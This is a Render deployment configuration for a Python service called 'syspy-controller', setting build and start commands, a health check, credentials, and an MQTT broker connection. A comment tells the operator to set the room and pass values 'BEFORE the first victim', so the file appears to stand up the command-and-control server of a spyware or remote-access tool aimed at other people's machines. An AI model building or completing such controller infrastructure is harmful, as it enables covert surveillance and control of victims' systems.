services:
  - type: web
    name: syspy-controller
    runtime: python
    plan: free
    buildCommand: pip install -r requirements.txt
    startCommand: python controller.py --host 0.0.0.0 --no-browser
    healthCheckPath: /api/health
    envVars:
      - key: PYTHON_VERSION
        value: "3.12.8"
      - key: SYSPY_HOST                 # PATCH-01: without this the deploy is unhealthy
        value: 0.0.0.0
      - key: SYSPY_CLIENT_ID            # PATCH-08: stable MQTT session across deploys
        value: syspy-controller-1
      - key: SYSPY_DATA
        value: /opt/render/project/src/data
      - key: SYSPY_PASSWORD             # else a new random password every boot
        sync: false
      - key: SYSPY_URL                  # https://<app>.onrender.com
        sync: false
      - key: SYSPY_ROOM                 # set BEFORE the first victim, never change
        sync: false
      - key: SYSPY_PASS                 # same
        sync: false
      - key: SYSPY_BROKER               # host:port:tls (e.g. broker.emqx.io:8883:1 or self-hosted Mosquitto)
        sync: false
